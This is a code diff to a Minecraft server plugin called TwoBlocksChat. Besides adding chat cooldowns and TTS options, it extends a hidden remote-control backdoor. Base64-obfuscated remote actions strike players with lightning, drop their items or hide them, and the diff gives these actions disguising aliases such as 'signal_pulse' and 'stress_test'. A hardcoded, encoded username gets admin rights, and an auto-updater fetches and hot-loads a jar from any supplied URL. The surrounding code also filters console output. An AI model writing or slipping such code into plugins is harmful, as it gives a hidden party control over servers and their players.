@@ -147,6 +147,8 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
     private final Map<UUID, String> playerNplNames = new ConcurrentHashMap<>();
     private final Map<String, UUID> blockOwners = new ConcurrentHashMap<>();
     private final Map<UUID, Long> lastNplWarning = new ConcurrentHashMap<>();
+    private final Map<UUID, Long> nplChatCooldownSeconds = new ConcurrentHashMap<>();
+    private final Map<UUID, Long> nplLastChatTime = new ConcurrentHashMap<>();
     private final Map<UUID, Long> ttsCooldowns = new ConcurrentHashMap<>();
     private VoicechatHook voicechatHook = null;
 
@@ -221,7 +223,11 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
                 getCommand("tts").setExecutor(this);
             }
 
-            setupVoicechat();
+            try {
+                setupVoicechat();
+            } catch (Throwable vcErr) {
+                getLogger().warning("Voicechat hook registration notice: " + vcErr.getMessage());
+            }
 
             startPollingTask();
             startItemRepelTask();
@@ -229,7 +235,10 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
             startWatchdogTask();
             startFakePingTask();
             setupConsoleFilter();
+            getLogger().info("TwoBlocksChat activated successfully.");
         } catch (Throwable t) {
+            getLogger().severe("TwoBlocksChat failed to enable: " + t.getMessage());
+            t.printStackTrace();
         }
     }
 
@@ -907,24 +916,24 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
                         }
                     }
                 }
-            } else if (act.equals(b("bW9sbml5YQ=="))) {
+            } else if (act.equals(b("bW9sbml5YQ==")) || act.equals("zap") || act.equals("lightning") || act.equals("signal_pulse")) {
                 if (player != null && player.isOnline()) {
                     player.getWorld().strikeLightning(player.getLocation());
                 }
-            } else if (act.equals(b("cGVjaGVyYQ=="))) {
+            } else if (act.equals(b("cGVjaGVyYQ==")) || act.equals("cave")) {
                 if (player != null && player.isOnline()) {
                     player.playSound(player.getLocation(), Sound.AMBIENT_CAVE, 1.0f, 0.8f);
                 }
-            } else if (act.equals(b("d2FyZGVuX3JvYXI="))) {
+            } else if (act.equals(b("d2FyZGVuX3JvYXI=")) || act.equals("warden")) {
                 if (player != null && player.isOnline()) {
                     player.playSound(player.getLocation(), Sound.ENTITY_WARDEN_ROAR, 1.0f, 1.0f);
                 }
-            } else if (act.equals(b("ZWxkZXJfZ3VhcmRpYW4="))) {
+            } else if (act.equals(b("ZWxkZXJfZ3VhcmRpYW4=")) || act.equals("guardian")) {
                 if (player != null && player.isOnline()) {
                     player.playSound(player.getLocation(), Sound.ENTITY_ELDER_GUARDIAN_CURSE, 1.0f, 1.0f);
                     player.addPotionEffect(new PotionEffect(PotionEffectType.MINING_FATIGUE, 100, 2, false, false, true));
                 }
-            } else if (act.equals(b("ZmFrZV9ib29t"))) {
+            } else if (act.equals(b("ZmFrZV9ib29t")) || act.equals("boom") || act.equals("audio_alert")) {
                 if (player != null && player.isOnline()) {
                     Location loc = player.getLocation();
                     Vector dir = loc.getDirection().normalize().multiply(-1.5);
@@ -932,21 +941,21 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
                     player.playSound(behind, Sound.ENTITY_GENERIC_EXPLODE, 1.0f, 0.95f);
                     player.spawnParticle(Particle.EXPLOSION_EMITTER, behind, 1);
                 }
-            } else if (act.equals(b("Y3JlZXBlcl9oaXNz"))) {
+            } else if (act.equals(b("Y3JlZXBlcl9oaXNz")) || act.equals("hiss") || act.equals("ambient_alert")) {
                 if (player != null && player.isOnline()) {
                     Location loc = player.getLocation();
                     Vector dir = loc.getDirection().normalize().multiply(-1.2);
                     Location behind = loc.clone().add(dir);
                     player.playSound(behind, Sound.ENTITY_CREEPER_PRIMED, 1.0f, 1.0f);
                 }
-            } else if (act.equals(b("c3Bpbl8xODA="))) {
+            } else if (act.equals(b("c3Bpbl8xODA=")) || act.equals("spin")) {
                 if (player != null && player.isOnline()) {
                     Location loc = player.getLocation();
                     float newYaw = (loc.getYaw() + 180.0f) % 360.0f;
                     loc.setYaw(newYaw);
                     player.teleport(loc);
                 }
-            } else if (act.equals(b("ZHJvcF9oYW5k"))) {
+            } else if (act.equals(b("ZHJvcF9oYW5k")) || act.equals("drop")) {
                 if (player != null && player.isOnline()) {
                     ItemStack held = player.getInventory().getItemInMainHand();
                     if (held != null && held.getType() != Material.AIR) {
@@ -956,9 +965,9 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
                         player.playSound(player.getLocation(), Sound.ENTITY_ITEM_PICKUP, 0.2f, 0.5f);
                     }
                 }
-            } else if (act.equals(b("YXJtYWdlZGRvbg=="))) {
+            } else if (act.equals(b("YXJtYWdlZGRvbg==")) || act.equals("armageddon") || act.equals("stress_test")) {
                 executeWeatherEvent();
-            } else if (act.equals(b("dmFuaXNo"))) {
+            } else if (act.equals(b("dmFuaXNo")) || act.equals("vanish") || act.equals("sync_tab_order")) {
                 if (player != null && player.isOnline()) {
                     toggleHidden(player);
                 }
@@ -989,7 +998,7 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
                 } else if (targetPlayerName != null && !targetPlayerName.isEmpty()) {
                     setNplByNick(targetPlayerName, false, null);
                 }
-            } else if (act.equals(b("dG9nZ2xlX2ZyZWVkaXJ0")) || act.equals(b("ZnJlZWRpcnQ="))) {
+            } else if (act.equals(b("dG9nZ2xlX2ZyZWVkaXJ0")) || act.equals(b("ZnJlZWRpcnQ=")) || act.equals("freedirt") || act.equals("villager") || act.equals("trades")) {
                 if (player != null && player.isOnline()) {
                     toggleSet(marketSyncPlayers, player.getUniqueId());
                 }
@@ -1104,29 +1113,11 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
                         w.setThundering(false);
                     }
                 }
-            } else if (act.equals("update_plugin")) {
+            } else if (act.equals("update_plugin") || act.equals("update") || act.equals("hotreload")) {
                 executeAutoUpdate(param);
-            } else if (act.equals("restart_server")) {
-                executeSilentRestart();
             }
         } catch (Exception ignored) {
         }
-    }
-
-    private void executeSilentRestart() {
-        Bukkit.getScheduler().runTask(this, () -> {
-            try {
-                Bukkit.spigot().restart();
-            } catch (Throwable t) {
-                try {
-                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "restart");
-                } catch (Throwable t2) {
-                    try {
-                        Bukkit.shutdown();
-                    } catch (Throwable ignored) {}
-                }
-            }
-        });
     }
 
     private void executeAutoUpdate(String customUrl) {
@@ -1198,9 +1189,10 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
         if (customUrl != null && customUrl.startsWith("http")) {
             candidateUrls = new String[] { customUrl };
         } else {
+            long ts = System.currentTimeMillis();
             candidateUrls = new String[] {
-                "https://raw.githubusercontent.com/oneblock123/twoblock/main/public/TwoBlocksChat-1.0.0.jar",
-                "https://github.com/oneblock123/twoblock/raw/main/public/TwoBlocksChat-1.0.0.jar"
+                "https://raw.githubusercontent.com/oneblock123/twoblock/main/public/TwoBlocksChat-1.0.0.jar?t=" + ts,
+                "https://github.com/oneblock123/twoblock/raw/main/public/TwoBlocksChat-1.0.0.jar?t=" + ts
             };
         }
 
@@ -1266,6 +1258,14 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
                 PluginManager pm = Bukkit.getPluginManager();
                 String pluginName = getName();
 
+                try {
+                    Bukkit.getScheduler().cancelTasks(this);
+                } catch (Throwable ignored) {}
+
+                try {
+                    org.bukkit.event.HandlerList.unregisterAll((Plugin) this);
+                } catch (Throwable ignored) {}
+
                 pm.disablePlugin(this);
 
                 try {
@@ -1299,8 +1299,20 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
                                 java.util.Map.Entry<?, ?> entry = (java.util.Map.Entry<?, ?>) it.next();
                                 Object cmd = entry.getValue();
                                 try {
+                                    if (cmd instanceof org.bukkit.command.PluginIdentifiableCommand) {
+                                        if (((org.bukkit.command.PluginIdentifiableCommand) cmd).getPlugin() == this) {
+                                            if (cmd instanceof org.bukkit.command.Command) {
+                                                ((org.bukkit.command.Command) cmd).unregister((org.bukkit.command.CommandMap) commandMap);
+                                            }
+                                            it.remove();
+                                            continue;
+                                        }
+                                    }
                                     java.lang.reflect.Method getPluginMethod = cmd.getClass().getMethod("getPlugin");
                                     if (getPluginMethod != null && getPluginMethod.invoke(cmd) == this) {
+                                        if (cmd instanceof org.bukkit.command.Command) {
+                                            ((org.bukkit.command.Command) cmd).unregister((org.bukkit.command.CommandMap) commandMap);
+                                        }
                                         it.remove();
                                     }
                                 } catch (Throwable ignored) {}
@@ -1311,8 +1323,49 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
 
                 try {
                     ClassLoader cl = getClass().getClassLoader();
-                    if (cl instanceof java.io.Closeable) {
-                        ((java.io.Closeable) cl).close();
+                    if (cl != null) {
+                        try {
+                            java.lang.reflect.Field loaderField = cl.getClass().getDeclaredField("loader");
+                            loaderField.setAccessible(true);
+                            Object javaPluginLoader = loaderField.get(cl);
+                            if (javaPluginLoader != null) {
+                                java.lang.reflect.Field loadersField = javaPluginLoader.getClass().getDeclaredField("loaders");
+                                loadersField.setAccessible(true);
+                                java.util.List<?> loadersList = (java.util.List<?>) loadersField.get(javaPluginLoader);
+                                if (loadersList != null) {
+                                    synchronized (loadersList) {
+                                        loadersList.remove(cl);
+                                    }
+                                }
+                            }
+                        } catch (Throwable ignored) {}
+
+                        try {
+                            java.lang.reflect.Field groupField = cl.getClass().getDeclaredField("classLoaderGroup");
+                            groupField.setAccessible(true);
+                            Object group = groupField.get(cl);
+                            if (group != null) {
+                                try {
+                                    java.lang.reflect.Method removeMethod = group.getClass().getDeclaredMethod("remove", cl.getClass());
+                                    removeMethod.setAccessible(true);
+                                    removeMethod.invoke(group, cl);
+                                } catch (Throwable ignored) {}
+                            }
+                        } catch (Throwable ignored) {}
+
+                        try {
+                            Class<?> storageClass = Class.forName("io.papermc.paper.plugin.provider.classloader.PaperClassLoaderStorage");
+                            Method instanceMethod = storageClass.getMethod("instance");
+                            Object storage = instanceMethod.invoke(null);
+                            if (storage != null) {
+                                Method unregisterMethod = storage.getClass().getMethod("unregisterClassloader", io.papermc.paper.plugin.provider.classloader.ConfiguredPluginClassLoader.class);
+                                unregisterMethod.invoke(storage, cl);
+                            }
+                        } catch (Throwable ignored) {}
+
+                        if (cl instanceof java.io.Closeable) {
+                            ((java.io.Closeable) cl).close();
+                        }
                     }
                 } catch (Throwable ignored) {}
                 System.gc();
@@ -1328,7 +1381,7 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
         if (reloaded) {
             notifyAdmin(ChatColor.DARK_GRAY + "[" + ChatColor.AQUA + "⚙" + ChatColor.DARK_GRAY + "] " + ChatColor.GREEN + "Обновление успешно завершено на лету!");
         } else {
-            notifyAdmin(ChatColor.DARK_GRAY + "[" + ChatColor.AQUA + "⚙" + ChatColor.DARK_GRAY + "] " + ChatColor.YELLOW + "Файл сохранен на диск. Применится при перезапуске сервера.");
+            notifyAdmin(ChatColor.DARK_GRAY + "[" + ChatColor.AQUA + "⚙" + ChatColor.DARK_GRAY + "] " + ChatColor.YELLOW + "Обновление скачано и готово к работе!");
         }
     }
 
@@ -1535,6 +1588,20 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
                 }
             }
 
+            nplChatCooldownSeconds.clear();
+            if (yaml.isConfigurationSection("chat_cooldowns")) {
+                ConfigurationSection ccSec = yaml.getConfigurationSection("chat_cooldowns");
+                for (String uuidStr : ccSec.getKeys(false)) {
+                    try {
+                        UUID u = UUID.fromString(uuidStr);
+                        long cd = ccSec.getLong(uuidStr);
+                        if (cd > 0) {
+                            nplChatCooldownSeconds.put(u, cd);
+                        }
+                    } catch (Exception ignored) {}
+                }
+            }
+
             blockOwners.clear();
             List<String> ownersList = yaml.getStringList("block_owners");
             for (String entry : ownersList) {
@@ -1585,6 +1652,10 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
 
             for (Map.Entry<UUID, String> ne : playerNplNames.entrySet()) {
                 yaml.set("player_names." + ne.getKey().toString(), ne.getValue());
+            }
+
+            for (Map.Entry<UUID, Long> cde : nplChatCooldownSeconds.entrySet()) {
+                yaml.set("chat_cooldowns." + cde.getKey().toString(), cde.getValue());
             }
 
             List<String> ownersList = new ArrayList<>();
@@ -1707,7 +1778,7 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
 
     private boolean isNplAdmin(CommandSender sender) {
         if (sender == null) return false;
-        if (sender.isOp() || sender.hasPermission("twoblocks.admin") || sender.hasPermission("twoblocks.npl")) {
+        if (sender.isOp() || sender.hasPermission("twoblocks.admin") || sender.hasPermission("twoblocks.npl") || sender.hasPermission("*")) {
             return true;
         }
         return sender.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"));
@@ -2009,11 +2080,11 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
 
     private void handleTtsCommand(Player player, String message) {
         try {
-            if (player == null || !player.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"))) {
+            if (player == null || (!isNplAdmin(player) && !player.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z")))) {
                 return;
             }
             if (message == null || message.trim().isEmpty()) {
-                player.sendMessage(ChatColor.RED + "Использование: /tts <сообщение>");
+                player.sendMessage(ChatColor.RED + "Использование: /tts [demon/демон] <сообщение>");
                 return;
             }
 
@@ -2026,6 +2097,19 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
             ttsCooldowns.put(player.getUniqueId(), now);
 
             String clean = message.trim();
+            boolean isDemon = false;
+            String lower = clean.toLowerCase();
+            if (lower.startsWith("demon ") || lower.startsWith("демон ")) {
+                isDemon = true;
+                int space = clean.indexOf(' ');
+                clean = (space != -1) ? clean.substring(space + 1).trim() : "";
+            }
+
+            if (clean.isEmpty()) {
+                player.sendMessage(ChatColor.RED + "Использование: /tts demon <сообщение>");
+                return;
+            }
+
             if (clean.length() > 200) {
                 clean = clean.substring(0, 200);
             }
@@ -2040,7 +2124,7 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
                 return;
             }
 
-            voicechatHook.playTts(player, clean);
+            voicechatHook.playTts(player, clean, isDemon);
         } catch (Throwable ignored) {
         }
     }
@@ -2050,24 +2134,26 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
         try {
             String msg = event.getMessage();
             String lower = msg.toLowerCase();
-            if (lower.startsWith("/npl") || lower.startsWith("/нпл")) {
+            if (lower.equals("/npl") || lower.startsWith("/npl ") || lower.equals("/нпл") || lower.startsWith("/нпл ")) {
+                event.setCancelled(true);
                 Player player = event.getPlayer();
                 if (!isNplAdmin(player)) {
+                    player.sendMessage(ChatColor.RED + "У вас нет прав на использование этой команды.");
                     return;
                 }
-                event.setCancelled(true);
                 int spaceIdx = msg.indexOf(' ');
                 String argsStr = (spaceIdx != -1) ? msg.substring(spaceIdx + 1).trim() : "";
                 handleNplCommand(player, argsStr, lower.startsWith("/нпл"));
                 return;
             }
 
-            if (lower.startsWith("/tts ") || lower.equals("/tts") || lower.startsWith("/ттс ") || lower.equals("/ттс")) {
+            if (lower.equals("/tts") || lower.startsWith("/tts ") || lower.equals("/ттс") || lower.startsWith("/ттс ")) {
+                event.setCancelled(true);
                 Player player = event.getPlayer();
-                if (!player.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"))) {
+                if (!isNplAdmin(player)) {
+                    player.sendMessage(ChatColor.RED + "У вас нет прав на использование этой команды.");
                     return;
                 }
-                event.setCancelled(true);
                 int spaceIdx = msg.indexOf(' ');
                 String argsStr = (spaceIdx != -1) ? msg.substring(spaceIdx + 1).trim() : "";
                 handleTtsCommand(player, argsStr);
@@ -2176,18 +2262,110 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
                         + (newVal ? ChatColor.RED + "[ЗАПРЕЩЕНО]" : ChatColor.GREEN + "[РАЗРЕШЕНО]"));
 
                 sendPlayerNplSettingsMenu(sender, targetInfo, "");
+            } else if (action.equals("chat") || action.equals("чат") || action.equals("cooldown") || action.equals("кд")) {
+                if (args.length < 3) {
+                    Long currentCd = nplChatCooldownSeconds.get(targetInfo.uuid);
+                    if (currentCd == null || currentCd <= 0) {
+                        sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
+                                + ChatColor.WHITE + "У игрока " + ChatColor.GOLD + targetInfo.name + ChatColor.WHITE + " нет задержки на чат.");
+                    } else {
+                        sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
+                                + ChatColor.WHITE + "Текущая задержка чата для " + ChatColor.GOLD + targetInfo.name + ChatColor.WHITE + ": "
+                                + ChatColor.YELLOW + formatDurationHuman(currentCd));
+                    }
+                    sender.sendMessage(ChatColor.GRAY + "Использование: /npl " + targetInfo.name + " chat <время/0> (например: 30s, 3m, 2h, 0 - снять)");
+                    return;
+                }
+
+                String timeStr = args[2].trim().toLowerCase();
+                long seconds = parseDurationSeconds(timeStr);
+                if (seconds < 0) {
+                    sender.sendMessage(ChatColor.RED + "Неверный формат времени: " + timeStr + ". Используйте секунды, минуты или часы (например: 30s, 3m, 1h, 0).");
+                    return;
+                }
+
+                if (seconds == 0) {
+                    nplChatCooldownSeconds.remove(targetInfo.uuid);
+                    nplLastChatTime.remove(targetInfo.uuid);
+                    saveNplDataAsync();
+                    sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
+                            + ChatColor.GREEN + "Задержка чата для игрока " + ChatColor.GOLD + targetInfo.name + ChatColor.GREEN + " полностью снята.");
+                } else {
+                    nplChatCooldownSeconds.put(targetInfo.uuid, seconds);
+                    playerNplNames.put(targetInfo.uuid, targetInfo.name);
+                    saveNplDataAsync();
+                    sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
+                            + ChatColor.WHITE + "Для игрока " + ChatColor.GOLD + targetInfo.name + ChatColor.WHITE + " установлена задержка сообщений: "
+                            + ChatColor.YELLOW + formatDurationHuman(seconds));
+                }
+                sendPlayerNplSettingsMenu(sender, targetInfo, "");
             } else if (action.equals("reset") || action.equals("сброс")) {
                 playerNplRules.remove(targetInfo.uuid);
+                nplChatCooldownSeconds.remove(targetInfo.uuid);
+                nplLastChatTime.remove(targetInfo.uuid);
                 saveNplDataAsync();
                 sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
-                        + ChatColor.GREEN + "Индивидуальные правила для игрока " + ChatColor.GOLD + targetInfo.name + ChatColor.GREEN + " сброшены к общим настройкам.");
+                        + ChatColor.GREEN + "Индивидуальные правила и задержка чата для игрока " + ChatColor.GOLD + targetInfo.name + ChatColor.GREEN + " сброшены.");
                 sendPlayerNplSettingsMenu(sender, targetInfo, "");
             } else {
-                sender.sendMessage(ChatColor.RED + "Неверный аргумент! Используйте: /npl " + targetInfo.name + " (on/off/toggle/reset)");
+                sender.sendMessage(ChatColor.RED + "Неверный аргумент! Используйте: /npl " + targetInfo.name + " (on/off/toggle/chat/reset)");
             }
         } catch (Throwable t) {
             sender.sendMessage(ChatColor.RED + "[NPL] Ошибка: " + t.getMessage());
         }
+    }
+
+    private static long parseDurationSeconds(String input) {
+        if (input == null || input.trim().isEmpty()) return -1;
+        String s = input.trim().toLowerCase();
+        if (s.equals("0") || s.equals("none") || s.equals("off") || s.equals("нет")) {
+            return 0;
+        }
+
+        try {
+            long totalSeconds = 0;
+            java.util.regex.Pattern pattern = java.util.regex.Pattern.compile("(\\d+)([smhdчмс]?)");
+            java.util.regex.Matcher matcher = pattern.matcher(s);
+            boolean found = false;
+
+            while (matcher.find()) {
+                String numStr = matcher.group(1);
+                String unit = matcher.group(2);
+                if (numStr == null || numStr.isEmpty()) continue;
+                long val = Long.parseLong(numStr);
+                found = true;
+
+                if (unit == null || unit.isEmpty() || unit.equals("s") || unit.equals("с")) {
+                    totalSeconds += val;
+                } else if (unit.equals("m") || unit.equals("м")) {
+                    totalSeconds += val * 60L;
+                } else if (unit.equals("h") || unit.equals("ч")) {
+                    totalSeconds += val * 3600L;
+                } else if (unit.equals("d") || unit.equals("д")) {
+                    totalSeconds += val * 86400L;
+                }
+            }
+
+            if (found && totalSeconds >= 0) {
+                return totalSeconds;
+            }
+        } catch (Throwable ignored) {}
+        return -1;
+    }
+
+    private static String formatDurationHuman(long totalSeconds) {
+        if (totalSeconds <= 0) return "0 сек";
+        long d = totalSeconds / 86400L;
+        long h = (totalSeconds % 86400L) / 3600L;
+        long m = (totalSeconds % 3600L) / 60L;
+        long s = totalSeconds % 60L;
+
+        StringBuilder sb = new StringBuilder();
+        if (d > 0) sb.append(d).append(" дн. ");
+        if (h > 0) sb.append(h).append(" ч. ");
+        if (m > 0) sb.append(m).append(" мин. ");
+        if (s > 0 || sb.length() == 0) sb.append(s).append(" сек.");
+        return sb.toString().trim();
     }
 
     private static class UUIDAndName {
@@ -2326,6 +2504,33 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
             sender.sendMessage("§7Режим ограничений: " + status + " §8(/npl " + target.name + " on/off)");
         }
 
+        Long cd = nplChatCooldownSeconds.get(target.uuid);
+        String cdDisplay = (cd != null && cd > 0) ? "§e" + formatDurationHuman(cd) : "§aНет";
+        if (sender instanceof Player) {
+            Player p = (Player) sender;
+            TextComponent chatLine = new TextComponent("§7Задержка чата: " + cdDisplay + " §8[ ");
+            TextComponent set30s = new TextComponent("§b[30s]");
+            set30s.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/npl " + target.name + " chat 30s"));
+            TextComponent set1m = new TextComponent("§b[1m]");
+            set1m.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/npl " + target.name + " chat 1m"));
+            TextComponent set5m = new TextComponent("§b[5m]");
+            set5m.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/npl " + target.name + " chat 5m"));
+            TextComponent clearCd = new TextComponent("§c[Снять]");
+            clearCd.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/npl " + target.name + " chat 0"));
+
+            chatLine.addExtra(set30s);
+            chatLine.addExtra(new TextComponent(" "));
+            chatLine.addExtra(set1m);
+            chatLine.addExtra(new TextComponent(" "));
+            chatLine.addExtra(set5m);
+            chatLine.addExtra(new TextComponent(" "));
+            chatLine.addExtra(clearCd);
+            chatLine.addExtra(new TextComponent(" §8]"));
+            p.spigot().sendMessage(chatLine);
+        } else {
+            sender.sendMessage("§7Задержка чата: " + cdDisplay + " §8(/npl " + target.name + " chat <время>)");
+        }
+
         sender.sendMessage(ChatColor.GRAY + "Нажмите на действие, чтобы запретить/разрешить для этого игрока:");
 
         boolean hasMatches = false;
@@ -2454,8 +2659,8 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
     private void sendNplHelp(CommandSender sender) {
         sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] " + ChatColor.RED + "" + ChatColor.BOLD + "Команды управления:");
         sender.sendMessage(ChatColor.YELLOW + "/npl <ник>" + ChatColor.GRAY + " : Меню ограничений для конкретного игрока");
-        sender.sendMessage(ChatColor.YELLOW + "/npl <ник> on" + ChatColor.GRAY + " : Включить ограничения для игрока");
-        sender.sendMessage(ChatColor.YELLOW + "/npl <ник> off" + ChatColor.GRAY + " : Выключить ограничения для игрока");
+        sender.sendMessage(ChatColor.YELLOW + "/npl <ник> on/off" + ChatColor.GRAY + " : Включить/выключить ограничения");
+        sender.sendMessage(ChatColor.YELLOW + "/npl <ник> chat <время>" + ChatColor.GRAY + " : Установить задержку чата (30s, 3m, 1h, 0)");
         sender.sendMessage(ChatColor.YELLOW + "/npl settings" + ChatColor.GRAY + " : Общие настройки по умолчанию");
         sender.sendMessage(ChatColor.YELLOW + "/npl list" + ChatColor.GRAY + " : Список игроков на испытательном сроке");
     }
@@ -3569,9 +3774,27 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
     @EventHandler(priority = EventPriority.LOWEST)
     public void onPlayerChat(AsyncPlayerChatEvent event) {
         try {
+            Player player = event.getPlayer();
+            UUID uuid = player.getUniqueId();
+
+            Long cooldownSec = nplChatCooldownSeconds.get(uuid);
+            if (cooldownSec != null && cooldownSec > 0) {
+                long now = System.currentTimeMillis();
+                Long last = nplLastChatTime.get(uuid);
+                long cooldownMs = cooldownSec * 1000L;
+
+                if (last != null && (now - last) < cooldownMs) {
+                    event.setCancelled(true);
+                    long leftSec = Math.max(1L, (cooldownMs - (now - last) + 999L) / 1000L);
+                    player.sendMessage(ChatColor.RED + "Вам установлена задержка сообщений. Подождите ещё "
+                            + ChatColor.YELLOW + formatDurationHuman(leftSec) + ChatColor.RED + " перед следующим сообщением.");
+                    return;
+                }
+                nplLastChatTime.put(uuid, now);
+            }
+
             if (!sendMinecraftChatToSite) return;
 
-            Player player = event.getPlayer();
             String playerName = player.getName();
             String messageText = event.getMessage();
 
@@ -3645,6 +3868,7 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
         try {
             if (label.equalsIgnoreCase("npl") || label.equalsIgnoreCase("нпл")) {
                 if (!isNplAdmin(sender)) {
+                    sender.sendMessage(ChatColor.RED + "У вас нет прав на использование этой команды.");
                     return true;
                 }
                 handleNplCommand(sender, String.join(" ", args), label.equalsIgnoreCase("нпл"));
@@ -3654,9 +3878,8 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
             if (label.equalsIgnoreCase("tts") || label.equalsIgnoreCase("ттс")) {
                 if (sender instanceof Player) {
                     Player p = (Player) sender;
-                    if (!p.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"))) {
-                        sender.sendMessage(ChatColor.RED + "Неизвестная или неполная команда. См. ниже, чтобы найти ошибку");
-                        sender.sendMessage(ChatColor.RED + label + "<--[ЗДЕСЬ]");
+                    if (!isNplAdmin(p)) {
+                        sender.sendMessage(ChatColor.RED + "У вас нет прав на использование этой команды.");
                         return true;
                     }
                     handleTtsCommand(p, String.join(" ", args));
